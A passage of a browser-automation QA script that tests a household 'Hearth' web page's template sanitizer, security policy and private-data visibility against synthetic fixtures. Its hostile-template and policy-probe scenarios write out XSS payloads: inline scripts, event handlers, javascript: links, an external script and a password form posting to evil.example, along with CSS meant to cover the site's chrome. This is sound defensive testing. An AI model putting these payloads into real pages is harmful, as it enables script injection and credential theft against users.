// hearth-walk.mjs — the Hearth, walked in a real browser against synthetic data (POS-959).
//
//   node qa-shots/hearth-walk.mjs            (astro dev already serving on :4399; see below)
//
// WHAT THIS IS FOR. Every ruling on this page is about a thing landing on a screen: a template drawn
// from sanitized markup, slots filled from reads, a private part that must not show, a behavior that must
// answer a real pointer, and an adversarial template that must do nothing. None of that is reachable from a
// unit test, so this drives real chromium with real pointer events and READS what is on the page.
//
// NO LIVE OFFICE IS TOUCHED. Every request to postmark.town (and every /api call on the dev server, which
// astro.config.town.mjs would otherwise proxy to the live office) is intercepted by page.route and answered
// from qa-shots/hearth-fixtures.mjs: invented residents, invented letters. A request that reaches the network
// unanswered is recorded and fails the walk. No private data and no credential is used: the "signed-in"
// token is the literal string "fx-owner-token", which only these fixtures honour.
//
// The houses are two real PUBLIC households from the site's baked registry (their names and members are
// already on the public Households page); everything LIVE about them is the fixtures'.
//
//   npm run build && npx astro preview --config astro.config.town.mjs --port 4399 --host 127.0.0.1 &
//   node qa-shots/hearth-walk.mjs
//
// IT RUNS AGAINST THE BUILT SITE (astro preview), not `astro dev`: the Hearth page's security policy is written into
// the built html (town/scripts/hearth-csp.mjs), so only a build has it. Every scenario also listens for
// `securitypolicyviolation`: the host's own scripts and controls must run clean under the policy, and scenario ⑩ proves
// the policy itself stops an injected inline handler and an injected inline script (the layer beneath the sanitizer).
//
// Playwright is resolved from the PLAYWRIGHT env, else the world checkout's (installed, not installed here).
import fs from "node:fs";
import path from "node:path";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import * as fx from "./hearth-fixtures.mjs";
import { prepareEntry } from "../src/lib/hearth/entries.mjs";

const PW = process.env.PLAYWRIGHT ?? "/home/seat/trees-world/wld-27-world/node_modules/playwright";
const { chromium } = createRequire(import.meta.url)(PW);
const BASE = process.env.BASE ?? "http://127.0.0.1:4399";
const ROOT = path.resolve(fileURLToPath(new URL("..", import.meta.url)));
// POS-984: the walk now covers the ONE household page (/households/<slug>/), owner and visitor; the screenshots land beside it by default
const OUT = process.env.OUT ?? path.join(ROOT, "qa-shots", "pos984");
fs.mkdirSync(OUT, { recursive: true });
const households = JSON.parse(fs.readFileSync(path.join(ROOT, "src/data/postmark/households.json"), "utf8")).households;
const A_SLUG = "dreme-mynd", B_SLUG = "fox-hearth";
const A = households[A_SLUG].residents, B = households[B_SLUG].residents;
const OWNER_TOKEN = "fx-owner-token";

const results = [];
const record = (name, pass, detail = "") => { results.push({ name, pass, detail }); console.log(`${pass ? "PASS" : "FAIL"}  ${name}${detail ? "  —  " + detail : ""}`); };
const check = (name, cond, detail) => record(name, !!cond, detail === undefined ? "" : String(detail));

// ── the fixture office ──────────────────────────────────────────────────────
const log = [];            // every call the page made to the office: { path, auth, status }
const unanswered = [];     // requests that left the machine unanswered
let fail = new Set();      // path prefixes the fixture office answers 500 to, for the "missing data" scenario

function answer(url, headers) {
  const u = new URL(url);
  const p = u.pathname.replace(/^\/api(?=\/)/, "");
  const auth = headers.authorization ?? null;
  const asHandles = (h) => (households[A_SLUG].residents.includes(h) ? A : B);
  let m;
  if ([...fail].some((f) => p.startsWith(f) || (u.pathname + u.search).includes(f))) return { status: 500, body: { error: "fixture: this door is down" } };
  if ((m = /^\/doorstep\/([^/]+)$/.exec(p))) {
    const h = decodeURIComponent(m[1]);
    const idx = asHandles(h).indexOf(h);
    return { status: 200, body: fx.doorstep(h, { owner: auth === `Bearer ${OWNER_TOKEN}` && A.includes(h), n: idx }) };
  }
  if ((m = /^\/mail\/([^/]+)$/.exec(p))) return { status: 200, body: fx.outbox(decodeURIComponent(m[1])) };
  if (/^\/quests\//.test(p)) return { status: 200, body: fx.quests() };
  if (p === "/world/walkers") return { status: 200, body: fx.walkers([...A, ...B]) };
  if (p === "/world/conversations") return { status: 200, body: fx.conversations(A) };
  if (p === "/calendar") return { status: 200, body: fx.calendar(A[0]) };
  if (p === "/posts") return { status: 200, body: fx.posts(u.searchParams.get("class"), A) };
  // GET /me, as the office answers it: the handles, and the household block per handle (postmark-office src/households.mjs householdLookupOf)
  if (p === "/me") return auth === `Bearer ${OWNER_TOKEN}` ? { status: 200, body: { handles: A, households: Object.fromEntries(A.map((h) => [h, { key: A_SLUG, slug: A_SLUG, residents: [...A].sort() }])) } } : { status: 401, body: {} };
  return { status: 404, body: { error: "fixture: no such door " + p } };
}

let injectEntry = null;   // a prepared entry added to the page's registered list, for the hostile-template scenario

async function newPage(browser, { signedIn = false, viewport = { width: 1280, height: 900 } } = {}) {
  const ctx = await browser.newContext({ viewport });
  await ctx.addInitScript(() => {
    window.__cspv = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__cspv.push(`${e.violatedDirective} ${String(e.blockedURI).slice(0, 60)}`));
  });
  if (signedIn) {
    await ctx.addInitScript(([tok, handles]) => {
      // init scripts run in EVERY frame, and the household page now carries the residents' sandboxed window frames (POS-984),
      // whose opaque origin refuses storage: the sign-in is the top page's
      if (window.top !== window) return;
      localStorage.setItem("pm.oauth.token", JSON.stringify({ access_token: tok, obtained: Date.now(), expires_in: 3600 }));
      sessionStorage.setItem("pm.oauth.handles", JSON.stringify(handles));
    }, [OWNER_TOKEN, A]);
  }
  await ctx.route("**/*", async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    const local = url.hostname === "127.0.0.1" || url.hostname === "localhost";
    const office = url.hostname === "postmark.town" || (local && url.pathname.startsWith("/api/"));
    if (office) {
      const a = answer(req.url(), req.headers());
      log.push({ path: url.pathname.replace(/^\/api(?=\/)/, "") + url.search, auth: req.headers().authorization ?? null, status: a.status });
      return route.fulfill({ status: a.status, contentType: "application/json", body: JSON.stringify(a.body), headers: { "access-control-allow-origin": "*", "access-control-allow-headers": "*" } });
    }
    if (local && injectEntry && req.resourceType() === "document" && /^\/households\/[^/]+\/$/.test(url.pathname)) {
      const res = await route.fetch();
      let body = await res.text();
      body = body.replace(/(<script type="application\/json" data-hearth-entries[^>]*>)([\s\S]*?)(<\/script>)/, (m, a, json, z) => {
        const list = JSON.parse(json.replace(/\\u003c/g, "<"));
        list.push({ id: injectEntry.id, title: injectEntry.title, author: injectEntry.author, line: injectEntry.line, css: injectEntry.css, html: injectEntry.html });
        return a + JSON.stringify(list).split("<").join("\\u003c") + z;
      });
      return route.fulfill({ response: res, body });
    }
    if (local) return route.continue();
    unanswered.push(req.url());
    return route.abort();
  });
  const page = await ctx.newPage();
  page.on("pageerror", (e) => record("no page error", false, String(e).slice(0, 200)));
  return page;
}

const cleanUnderPolicy = async (page, label) => check(`${label}: the host runs clean under the page's security policy (no violation)`, (await page.evaluate(() => window.__cspv ?? [])).length === 0, JSON.stringify(await page.evaluate(() => window.__cspv ?? [])));
const shot = (page, name, opts = {}) => page.screenshot({ path: path.join(OUT, name + ".png"), ...opts });
const ready = async (page) => {
  await page.waitForSelector("[data-hearth-stage]");
  await page.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing, null, { timeout: 15000 });
  await page.waitForSelector("[data-hd-feed] .hd-line", { timeout: 15000 }).catch(() => {});
};
const text = (page, sel) => page.locator(sel).first().textContent().catch(() => null);
const visible = (page, sel) => page.locator(sel).first().isVisible().catch(() => false);

const SLOT_COUNT = 13;
const run = async () => {
  const browser = await chromium.launch();
  process.on("uncaughtException", async (e) => { console.error(e); await browser.close(); process.exit(1); });
  try {
    // ── ⑫ A DESIGN CANNOT PAINT OVER THE BAND (POS-984, Truey's review of ba023e9d9) ──
    // A `:root`, `html` or `body` rule is rewritten onto the design's own stage, where `margin` and `transform` are allowed and no
    // `!important` is needed, and the stage's `contain: paint` clips its children, not itself. The hostile rules below carry NO
    // `!important` on purpose (the `!important` ones are refused by the sanitizer, so a test written with them cannot see this).
    // The host's frame (`.hearth-frame { contain: paint }`) is what keeps the band on top; WALK_ONLY=rooted runs just this.
    {
      const pointAt = (page) => page.evaluate(() => {
        const out = {};
        for (const [name, sel] of [["Needs you", "[data-hband] #hband-needs-h"], ["Managing the house", "#hband-manage-h"], ["the quests", "[data-hband] [data-quests] [data-quests-day]"], ["the likeness answer", "[data-hband] .hd-like-ask a"]]) {
          const e = document.querySelector(sel);
          if (!e) { out[name] = "absent"; continue; }
          e.scrollIntoView({ block: "center", behavior: "instant" });
          const r = e.getBoundingClientRect();
          const top = document.elementFromPoint(r.left + Math.min(20, r.width / 2), r.top + r.height / 2);
          out[name] = top && document.querySelector("[data-hband]").contains(top) ? "band" : top?.closest("[data-hearth-stage]") ? "stage" : String(top?.tagName);
        }
        return out;
      });
      const asBand = (o) => Object.values(o).every((v) => v === "band");
      const rules = [
        ["control, no rule", "rooted-none", ".u-nothing { color: red }"],
        ["a margin pulling the design up, and a background to paint with", "rooted-margin", ":root { margin-top: -900px; background: #0b0f1c; }"],
        ["a transform lifting the design", "rooted-transform", "html { transform: translateY(-900px); background: #0b0f1c; }"],
        ["body, the same trick", "rooted-body", "body { margin-top: -900px; background: #0b0f1c; position: relative; top: -50px; }"],
      ];
      for (const [what, id, css] of rules) {
        const e = prepareEntry({ id, title: id, author: "nobody", line: "A rooted rule.", html: "<hearth-house></hearth-house><hearth-residents></hearth-residents>", css });
        const kept = id === "rooted-none" || /margin-top\s*:\s*-900px|translateY\(-900px\)/.test(e.css);
        check(`⑫ ${what}: the sanitizer lets the rule through (so this test can see the failure)`, e.ok && kept && !e.problems.some((p) => /margin|transform|top/.test(p)), e.css.slice(0, 160) + " " + JSON.stringify(e.problems));
        injectEntry = e;
        const page = await newPage(browser, { signedIn: true });
        await page.goto(`${BASE}/households/${A_SLUG}/?entry=${id}`, { waitUntil: "load" });
        await ready(page);
        await page.waitForSelector("[data-hband] [data-hd-needs-box]:not([hidden])", { timeout: 15000 });
        await page.waitForSelector("[data-hband] [data-quests]:not([hidden])", { timeout: 15000 }).catch(() => {});
        check(`⑫ ${what}: the design drawn is the hostile one`, (await page.locator("[data-hearth-stage]").getAttribute("data-hearth-entry")) === id);
        const moved = await page.evaluate(() => { const s = document.querySelector("[data-hearth-stage]").getBoundingClientRect().top; const f = (document.querySelector(".hearth-frame") ?? document.querySelector("[data-hearth-stage]")).getBoundingClientRect().top; return Math.round(f - s); });
        if (id !== "rooted-none") check(`⑫ ${what}: the rule took effect: the design's own box sits ${moved}px above where it was put`, moved > 300, moved);
        const at = await pointAt(page);
        check(`⑫ ${what}: the band's controls are still the top thing at their own points (Needs you, Managing the house, the quests, the likeness answer)`, asBand(at), JSON.stringify(at));
        await shot(page, `16-rooted-${id}-desktop`, { fullPage: false });
        await page.context().close();
        injectEntry = null;
      }
      if (process.env.WALK_ONLY === "rooted") {
        await browser.close();
        const bad = results.filter((r) => !r.pass);
        console.log(`\n${results.length - bad.length}/${results.length} checks passed (WALK_ONLY=rooted)`);
        process.exit(bad.length ? 1 : 0);
      }
    }

    // ── ① the default Hearth, a public reader, house A ─────────────────────────
    {
      log.length = 0;
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
      check("① the Hearth page carries its security policy: scripts are self and hashes only", !!policy && /script-src 'self' 'sha256-/.test(policy) && !/script-src[^;]*unsafe-inline/.test(policy), policy?.slice(0, 120));
      check("① opens on Postmark's default", (await page.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "default");
      check("① the house slot names the house", /dreme|mynd/i.test((await text(page, "[data-hearth-slot=house]")) ?? ""), await text(page, "[data-hearth-slot=house]"));
      check("① a card for every resident", (await page.locator("[data-hearth-slot=residents] [data-hd-card]").count()) === A.length, await page.locator("[data-hearth-slot=residents] [data-hd-card]").count());
      check("① the feed is painted from the fixture reads, not frozen", (await page.locator("[data-hd-feed] .hd-line").count()) > 0);
      check("① the page teaches the holo expansion once, below the stage, shown because the house holds holo", (await page.locator("[data-hearth-holo]").count()) === 1 && (await visible(page, "[data-hearth-holo]")) && ((await page.content()).match(/short for holographic stamp/g) ?? []).length === 1);
      check("① stamps are the doorsteps' sum", /\d/.test((await text(page, "[data-hd-n-held]")) ?? ""), await text(page, "[data-hd-n-held]"));
      check("① posts: only the house's own", (await page.locator("[data-hx-posts] li").count()) === 2 && !(await text(page, "[data-hx-posts]"))?.includes("not this house"), await text(page, "[data-hx-posts]"));
      check("① closest correspondents slot is drawn (public record; its tab is not the open one)", (await page.locator("[data-hearth-slot=closer] .hx-list li, [data-hearth-slot=closer] .hd-empty").count()) >= 1);
      check("① the countdown is live and ticking", await (async () => {
        const a = await text(page, '[data-hx-left="crossing"]'); await page.waitForTimeout(2100); const b = await text(page, '[data-hx-left="crossing"]');
        return a && b && a !== b ? true : `${a} → ${b}`;
      })());
      check("① a public reader sees NO private slot", !(await visible(page, "[data-hearth-slot=needs-you]")) && !(await visible(page, "[data-hearth-slot=mail]")));
      check("① no bearer went to any doorstep for a public reader", log.every((l) => l.auth === null), JSON.stringify(log.filter((l) => l.auth)));
      await shot(page, "01-default-public-desktop", { fullPage: true });
      // tabs, with a real pointer and then the keyboard
      check("① tabs: the first panel shows, the others hide", (await page.locator('.hx-tab[aria-selected="true"]').innerText()) === "Posts" && (await page.locator('[role=tabpanel]:not([hidden])').count()) === 1);
      await page.getByRole("tab", { name: "Marks" }).click();
      check("① tabs: a real click shows Marks", (await visible(page, "[data-hx-marks]")) && !(await visible(page, "[data-hx-posts]")));
      await page.getByRole("tab", { name: "Marks" }).press("ArrowRight");
      check("① tabs: ArrowRight moves on to the next tab", (await page.locator('.hx-tab[aria-selected="true"]').innerText()) === "Closest correspondents");
      await shot(page, "02-default-tabs-desktop");
      await cleanUnderPolicy(page, "①");
      // member links still work
      const first = A[0];
      await page.locator(`[data-hearth-slot=residents] [data-hd-card="${first}"] .hd-card-name`).click();
      await page.waitForLoadState("load");
      check("① a resident's name opens their seat on the household page", page.url().includes(`/households/${A_SLUG}/?resident=${encodeURIComponent(first)}`), page.url());
      await page.context().close();
    }

    // ── ② preview any entry: ledger on house A, by the picker and by the URL ───
    {
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      await page.selectOption("[data-hearth-pick]", "ledger");
      await page.waitForFunction(() => document.querySelector("[data-hearth-stage]")?.dataset.hearthEntry === "ledger");
      check("② the picker previews the second entry without a reload", (await page.locator("[data-hearth-stage]").getAttribute("data-hearth-entry")) === "ledger");
      check("② and keeps the preview in the address, only", new URL(page.url()).searchParams.get("entry") === "ledger", page.url());
      await page.waitForSelector("[data-hx-chart] .hx-bar-row", { state: "attached", timeout: 10000 });
      check("② the stamps chart draws a bar per resident", (await page.locator("[data-hx-chart] .hx-bar-row").count()) === A.length);
      await page.waitForSelector("[data-hx-map] .hx-place", { state: "attached", timeout: 10000 });
      check("② the residents map groups residents by place", (await page.locator("[data-hx-map] .hx-place").count()) >= 1, await text(page, "[data-hx-map]"));
      check("② accordion: first panel open, others closed", (await page.locator('.hx-acc-head[aria-expanded="true"]').count()) === 1);
      await page.getByRole("button", { name: "Around town" }).click();
      check("② accordion: a real click opens Around town", (await page.getByRole("button", { name: "Around town" }).getAttribute("aria-expanded")) === "true" && (await visible(page, "[data-hx-town-events] li")));
      check("② around-town events come from the calendar fixture", /synthetic/i.test((await text(page, "[data-hx-town-events]")) ?? ""), await text(page, "[data-hx-town-events]"));
      await shot(page, "03-ledger-preview-desktop", { fullPage: true });
      // a reload on ?entry= opens that entry straight away
      await page.reload({ waitUntil: "load" });
      await ready(page);
      check("② ?entry=ledger opens the ledger on load", (await page.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "ledger");
      await page.selectOption("[data-hearth-pick]", "default");
      await page.waitForFunction(() => document.querySelector("[data-hearth-stage]")?.dataset.hearthEntry === "default");
      check("② back to the default clears the address", !new URL(page.url()).searchParams.has("entry"), page.url());
      await cleanUnderPolicy(page, "②");
      await page.context().close();
    }

    // ── ③ an unknown entry, an unknown household ───────────────────────────────
    {
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${B_SLUG}/?entry=no-such-entry`, { waitUntil: "load" });
      await ready(page);
      check("③ an unknown entry says so and shows the default", /No Hearth entry is registered as/.test((await text(page, "[data-hearth-note]")) ?? "") && (await page.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "default", await text(page, "[data-hearth-note]"));
      const r = await page.goto(`${BASE}/households/no-such-household/`, { waitUntil: "load" });
      check("③ an undeclared household has no page: 404", r?.status() === 404, r?.status());
      const r1 = await page.goto(`${BASE}/households/no-such-household/hearth/`, { waitUntil: "load" });
      check("③ and no old Hearth address either: 404", r1?.status() === 404, r1?.status());
      const r2 = await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      check("③ the household's one page is the Hearth: 200, a design on its stage, and no link to a second page", r2?.status() === 200 && (await page.locator("[data-hearth-stage]").count()) === 1 && (await page.locator(`a[href$="/hearth/"]`).count()) === 0);
      await page.context().close();
    }

    // ── ④ the house's own sign-in sees the private slots; another house's page does not ──
    {
      log.length = 0;
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      // POS-984: Needs you is the SITE's band above the design; the design's own copy of the slot stands down, so it is shown once
      await page.waitForSelector("[data-hband] [data-hd-needs-box]:not([hidden])", { timeout: 15000 });
      check("④ the owner sees Needs you in the band, from the fixture's stances", /awaiting the house/.test((await text(page, "[data-hband] [data-hd-needs-box]")) ?? ""), await text(page, "[data-hband] [data-hd-needs-box]"));
      check("④ and only once: the design's own Needs you slot stands down", !(await visible(page, "[data-hearth-slot=needs-you]")) && (await page.locator("[data-hd-needs-box]:visible").count()) === 1);
      await page.waitForSelector("[data-hearth-slot=mail]:not([hidden])", { state: "attached", timeout: 15000 });   // painted for the owner, though the host stands it down
      // POS-984 (review): the design's mail summary is painted (the markup is the design's) but stands down, so the waiting letters show once, in the band
      check("④ the private mail summary is painted from the owner's reads, and stands down: the band's boat line carries the waiting letters once", /waiting for the crossing/.test((await text(page, "[data-hearth-slot=mail]")) ?? "") && !(await visible(page, "[data-hearth-slot=mail]")) && (await visible(page, "[data-hband] [data-hd-boat]")) && (await page.locator("[data-hearth-slot=mail]:visible, [data-hd-boat]:visible").count()) === 1, await text(page, "[data-hearth-slot=mail]"));
      check("④ the bearer went only to the house's own doorsteps", log.filter((l) => l.auth).every((l) => A.some((h) => l.path.startsWith(`/doorstep/${h}`)) || l.path === "/me"), JSON.stringify(log.filter((l) => l.auth).map((l) => l.path)));
      await shot(page, "04-default-owner-desktop", { fullPage: true });
      await cleanUnderPolicy(page, "④ (signed in)");
      log.length = 0;
      await page.goto(`${BASE}/households/${B_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      await page.waitForTimeout(800);
      check("④ the same sign-in on ANOTHER house's Hearth shows no private slot", !(await visible(page, "[data-hearth-slot=needs-you]")) && !(await visible(page, "[data-hearth-slot=mail]")));
      check("④ and sends no bearer to that house's doorsteps", log.filter((l) => l.path.startsWith("/doorstep/")).every((l) => l.auth === null), JSON.stringify(log.filter((l) => l.auth && l.path.startsWith("/doorstep/"))));
      check("④ the other house's page carries none of the owner's private words", !(await page.content()).includes("waiting for the crossing"));
      // POS-984 (review, paper cut): a signed-in reader of ANOTHER house is told so, plainly, not asked a bare question
      check("④ and says plainly that this is not their house, with no sign-in button and no bare question", (await visible(page, "[data-hband] [data-hband-notyours]")) && /isn’t your house/.test((await text(page, "[data-hband] [data-hband-notyours]")) ?? "") && !(await visible(page, "[data-hband] [data-hd-signin]")), await text(page, "[data-hband] .hband-visit"));
      await page.context().close();
    }

    // ── ⑤ a door that is down is said, never drawn as zero ──────────────────────
    {
      fail = new Set(["/world/walkers", "/posts", "/calendar"]);
      const page = await newPage(browser);
      await page.goto(`${BASE}/households/${A_SLUG}/?entry=ledger`, { waitUntil: "load" });
      await ready(page);
      await page.waitForSelector("[data-hx-map] .hd-empty", { state: "attached", timeout: 10000 });
      check("⑤ the map says the roll could not be read", /could not be read/.test((await text(page, "[data-hx-map]")) ?? ""), await text(page, "[data-hx-map]"));
      check("⑤ posts say they could not be read, not 'no posts'", /could not be read/.test((await text(page, "[data-hx-posts]")) ?? "") && !/has no ideas or bugs/.test((await text(page, "[data-hx-posts]")) ?? ""), await text(page, "[data-hx-posts]"));
      check("⑤ the calendar says it could not be read", /could not be read/.test((await text(page, "[data-hx-town-events]")) ?? ""), await text(page, "[data-hx-town-events]"));
      await shot(page, "05-doors-down-desktop", { fullPage: true });
      await page.context().close();
      fail = new Set();
    }

    // ── ⑥ the phone ─────────────────────────────────────────────────────────────
    {
      const page = await newPage(browser, { viewport: { width: 390, height: 800 } });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
      check("⑥ no sideways scroll at 390px", overflow <= 1, overflow);
      await shot(page, "06-default-phone", { fullPage: true });
      await page.goto(`${BASE}/households/${A_SLUG}/?entry=ledger`, { waitUntil: "load" });
      await ready(page);
      check("⑥ the ledger at 390px: no sideways scroll", (await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 1);
      await shot(page, "07-ledger-phone", { fullPage: true });
      await page.context().close();
    }

    // ── ⑧ a hostile template, sanitized by the build, drawn by the real page: it does nothing ──
    {
      const hostile = prepareEntry({
        id: "hostile", title: "A hostile template", author: "nobody", line: "Every trick at once.",
        html: `<div class="cover"><script>window.__pwned = "script"</script><img src=x onerror="window.__pwned='onerror'"><svg onload="window.__pwned='svg'"></svg>` +
          `<a href="javascript:window.__pwned='href'" id="evil-link">click me</a><iframe src="https://evil.example/frame"></iframe><form action="https://evil.example/steal"><input name="pw" type="password"></form>` +
          `<img src="https://evil.example/track.gif"><hearth-residents><script>window.__pwned='slot'</script></hearth-residents><hearth-needs-you></hearth-needs-you><hearth-mail></hearth-mail>` +
          `<p onclick="window.__pwned='click'" style="position:fixed;top:0;left:0;width:100vw;height:100vh">cover the page</p></div>`,
        css: `@import url("https://evil.example/x.css"); .cover { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: red; z-index: 99999 } nav, .hearth-bar, h1, header, .hx-name { display: none } p { background: url(https://evil.example/bg.gif); position: fixed }`,
      });
      check("⑧ the build sanitizer lets the hostile entry through only as safe markup", hostile.ok && !/script|onerror|onload|javascript:|iframe|form|evil\.example/i.test(hostile.html) && !/fixed|url|import/i.test(hostile.css), hostile.html.slice(0, 200));
      injectEntry = hostile;
      const before = unanswered.length;
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/?entry=hostile`, { waitUntil: "load" });
      await ready(page);
      await page.waitForTimeout(1500);
      const state = await page.evaluate(() => {
        const stage = document.querySelector("[data-hearth-stage]");
        const attrs = [...stage.querySelectorAll("*")].flatMap((e) => [...e.attributes].map((a) => a.name));
        const bar = document.querySelector(".hearth-bar");
        // the owner's band sits above the bar now, so the bar can start below the fold: elementFromPoint answers null off-screen
        bar.scrollIntoView({ block: "center", behavior: "instant" });   // the site's CSS smooth-scrolls otherwise, and the rect below would be read mid-flight
        const r = bar.getBoundingClientRect();
        const top = document.elementFromPoint(r.left + 40, r.top + r.height / 2);
        return {
          pwned: window.__pwned ?? null, entry: stage.dataset.hearthEntry,
          banned: stage.querySelectorAll("script, iframe, object, embed, form, input, style, link, svg").length,
          handlers: attrs.filter((n) => /^on/.test(n)), styleAttr: attrs.includes("style") && [...stage.querySelectorAll("[style]")].filter((e) => !e.closest("[data-hd-card], .hx-bar, .hd-who, .hd-line")).length,
          links: [...stage.querySelectorAll("a")].map((a) => a.getAttribute("href") ?? "").filter((h) => /^javascript:/i.test(h)).length,
          barShown: getComputedStyle(bar).display !== "none" && r.height > 20, barOnTop: bar.contains(top), barBox: [Math.round(r.left), Math.round(r.top), Math.round(r.width), Math.round(r.height)], topIs: top ? top.tagName + "." + top.className : null,
          pickerShown: !!document.querySelector("[data-hearth-pick]")?.offsetParent,
          navShown: getComputedStyle(document.querySelector("nav") ?? document.body).display !== "none",
          stageBox: (() => { const b = stage.getBoundingClientRect(); return [Math.round(b.left), Math.round(b.top), Math.round(b.width), Math.round(b.height)]; })(),
        };
      });
      check("⑧ no template code ran: nothing set window.__pwned", state.pwned === null, state.pwned);
      check("⑧ the stage is the hostile entry, and holds no script, frame, form, input, style, link or svg", state.entry === "hostile" && state.banned === 0, JSON.stringify(state));
      check("⑧ no event handler and no javascript: link on the stage", state.handlers.length === 0 && state.links === 0, JSON.stringify(state.handlers));
      check("⑧ its CSS could not cover or hide the site's own chrome (bar, picker, nav)", state.barShown && state.barOnTop && state.pickerShown && state.navShown, JSON.stringify(state));
      check("⑧ the private slots it placed stay the house's: the owner sees Needs you in the site's band, the template received nothing", (await visible(page, "[data-hband] [data-hd-needs-box]")) && !(await page.evaluate(() => JSON.stringify(window.__pwned ?? "")).then((v) => /awaiting|waiting/.test(v))));
      check("⑧ and the site's band is on top, whole, under that template's every trick", await page.evaluate(() => { const b = document.querySelector("[data-hband]"); b.scrollIntoView({ block: "start", behavior: "instant" }); const r = b.getBoundingClientRect(); const top = document.elementFromPoint(r.left + 30, r.top + Math.min(r.height - 4, 30)); return getComputedStyle(b).display !== "none" && r.height > 40 && b.contains(top); }));
      check("⑧ nothing went to the hostile host", unanswered.slice(before).every((u) => !/evil\.example/.test(u)) && log.every((l) => !/evil/.test(l.path)), unanswered.slice(before).join(" "));
      await shot(page, "08-hostile-template-desktop", { fullPage: true });
      await cleanUnderPolicy(page, "⑧");
      await page.context().close();
      injectEntry = null;
    }

    // ── ⑨ the town repo's STARTER, as a submission would be: clean, every slot, and the sort and single-open behaviors ──
    {
      const TOWN = process.env.TOWN ?? "/home/seat/trees/pool/town-1";
      const dir = path.join(TOWN, "PROJECTS", "household-hearths", "STARTER");
      if (!fs.existsSync(dir)) record("⑨ the STARTER kit", false, "no town checkout at " + TOWN);
      else {
        const starter = prepareEntry({ id: "starter-kit", title: "Starter", author: "starter", line: "", html: fs.readFileSync(path.join(dir, "hearth.html"), "utf8"), css: fs.readFileSync(path.join(dir, "hearth.css"), "utf8") });
        check("⑨ the STARTER kit is clean (the sanitizer removes nothing) and uses every slot", starter.ok && starter.problems.length === 0 && starter.slots.length === SLOT_COUNT, JSON.stringify(starter.problems));
        injectEntry = starter;
        const page = await newPage(browser);
        await page.goto(`${BASE}/households/${B_SLUG}/?entry=starter-kit`, { waitUntil: "load" });
        await ready(page);
        const order = () => page.locator("[data-hearth-behavior=sort] > li").allInnerTexts();
        check("⑨ sort: listed order to begin with", (await order()).join("|") === "Birch, 3|Ash, 12|Cedar, 7", (await order()).join("|"));
        await page.selectOption(".hx-sort-select", "size:desc");
        check("⑨ sort: a real choice reorders by size, descending", (await order()).join("|") === "Ash, 12|Cedar, 7|Birch, 3", (await order()).join("|"));
        await page.selectOption(".hx-sort-select", "name");
        check("⑨ sort: by name, ascending", (await order()).join("|") === "Ash, 12|Birch, 3|Cedar, 7");
        await page.selectOption(".hx-sort-select", "");
        check("⑨ sort: back to as listed", (await order()).join("|") === "Birch, 3|Ash, 12|Cedar, 7");
        const heads = page.locator("[data-hearth-behavior=accordion] .hx-acc-head");
        await heads.nth(1).click();
        check("⑨ accordion with data-single: opening one closes the other", (await heads.nth(0).getAttribute("aria-expanded")) === "false" && (await heads.nth(1).getAttribute("aria-expanded")) === "true");
        await shot(page, "09-starter-kit-desktop", { fullPage: true });
        await cleanUnderPolicy(page, "⑨");
        await page.context().close();
        injectEntry = null;
      }
    }

    // ── ⑩ the policy is a SECOND layer: what a sanitizer bug would let through still does not run ──
    {
      const before = unanswered.length;
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      await page.evaluate(() => {
        window.__cspv = [];
        const stage = document.querySelector("[data-hearth-stage]");
        const host = document.createElement("div");
        host.id = "csp-probe";
        // what an unsanitized template could carry: an inline handler that fires, and a javascript: link
        host.innerHTML = '<img src="/media/does-not-exist.png" onerror="window.__pwned=\'handler\'"><a id="jslink" href="javascript:window.__pwned=\'href\'">run</a>';
        stage.appendChild(host);
        // an inline script written in by script, an external one from another host, eval, and Function
        const sc = document.createElement("script"); sc.textContent = "window.__pwned='inline'"; stage.appendChild(sc);
        const ext = document.createElement("script"); ext.src = "https://evil.example/x.js"; stage.appendChild(ext);
        // string-to-code (a string timer): DevTools-run code is exempt from the eval rule itself, but a timer the PAGE runs is not
        setTimeout("window.__pwned='timer'", 0);
      });
      await page.locator("#jslink").click();                  // a real click on the javascript: link
      await page.waitForTimeout(700);
      const st = await page.evaluate(() => ({ pwned: window.__pwned ?? null, v: window.__cspv }));
      check("⑩ no injected code ran: handler, javascript: link, inline script, external script, string timer", st.pwned === null, JSON.stringify(st));
      check("⑩ the policy says so: inline handler, inline script, javascript: link, the string timer and the external script were each refused", ["inline", "eval", "evil.example"].every((k) => st.v.some((x) => x.includes(k))), JSON.stringify(st.v));
      check("⑩ the external script's host was never contacted", unanswered.slice(before).every((u) => !/evil\.example/.test(u)), unanswered.slice(before).join(" "));
      await page.evaluate(() => { window.__cspv = []; document.getElementById("csp-probe")?.remove(); });
      await page.getByRole("tab", { name: "Marks" }).click();
      check("⑩ and the host's own controls still answer a real click after all that", await visible(page, "[data-hx-marks]"));
      await cleanUnderPolicy(page, "⑩ (after the probe)");
      await page.context().close();
    }

    // ── ⑪ ONE PAGE (POS-984): the Hearth draws the house for everyone; the site's band is the signed-in human's ──
    {
      // a visitor: the design and the sign-in line, and nothing of the band's body
      const v = await newPage(browser);
      await v.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(v);
